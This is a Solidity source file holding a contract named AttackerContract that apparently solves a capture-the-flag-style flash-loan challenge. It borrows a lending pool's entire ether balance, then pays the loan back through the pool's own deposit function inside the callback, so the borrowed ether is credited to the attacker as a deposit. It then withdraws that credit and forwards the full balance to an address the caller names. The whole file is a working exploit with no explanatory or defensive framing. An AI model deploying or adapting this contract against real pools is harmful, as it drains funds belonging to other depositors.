// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface IFlashLoan {
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
}

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract AttackerContract is IFlashLoanEtherReceiver {
    IFlashLoan immutable flashLoanContract;

    constructor(address flashLoanContract_) {
        flashLoanContract = IFlashLoan(flashLoanContract_);
    }

    function exploitFlashLoan() external {
        flashLoanContract.flashLoan(address(flashLoanContract).balance);
    }

    function execute() external payable {
        flashLoanContract.deposit{value: msg.value}();
    }

    fallback() external payable {}

    function withdraw(address payable valueReceiver) external payable {
        flashLoanContract.withdraw();
        valueReceiver.send(address(this).balance);
    }
}
